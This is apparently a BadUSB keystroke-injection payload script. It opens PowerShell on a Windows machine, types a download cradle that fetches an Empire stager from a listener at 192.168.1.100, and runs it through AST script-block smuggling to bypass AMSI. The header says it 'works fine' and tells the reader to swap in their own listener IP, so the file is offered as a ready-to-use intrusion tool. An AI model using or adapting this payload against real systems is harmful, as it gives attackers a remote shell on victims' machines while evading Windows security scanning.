/*
AMSI Bypass Skript-Block-Smuggling, load Empire Stager and Enter the System
For the nerds, feel free to test your local system. Your Welcome to spend me a coffee >> :-D cU 
It works fine. Change the IP to your Empire stagers adress.
---------------------------------------------
bring the action
---------------------------------------------
author: Klau5t4ler0x90
*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell.exe");
    press("ENTER");
}

// run PowerShell as Admin (if user is)
function win10AsAdmin() {
  press("GUI"); //open search
  delay(200);
  type(ps_wow64); //enter target binary
  delay(500); // wait for search to finish
  press("RIGHT");
  press("DOWN");
  press("ENTER"); 
  delay(1000);
  press("LEFT");
  press("ENTER");
}

//change folder
function backToTemp() {
    type("cd ..");
  press("ENTER");
  type("cd ..");
  press("ENTER");
  type("cd ..");
  press("ENTER");
  type("cd temp");
  press("ENTER");
}

// Load Empire Shell and execute
function revShell() {
  type("$531 = (new-Object net.webclient).downloadstring('http://");
  type("192.168.1.100:80");         //HERE EMPIRE LISTENER IP ADRESS WITH PORT
  type("/download/powershell/');");
  press("ENTER");
  type("$SpoofedAst = [ScriptBlock]::Create(\"Write-Output 'Hello'\").Ast");
  press("ENTER");
  type("$ExecutedAst = [ScriptBlock]::Create(\"$531\").Ast");
  press("ENTER");
  type("$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent, $null, $null, $null, $ExecutedAst.EndBlock.Copy(),$null)");
  press("ENTER");
  type("$Sb = $Ast.GetScriptBlock()");
  press("ENTER");
  type("& $Sb");
  press("ENTER");
}

layout('de');			// DE keyboard layout
fast();

//win10AsAdmin();
//delay(1000);
//backToTemp();
//delay(1100);
startPS();
delay(1000);
revShell();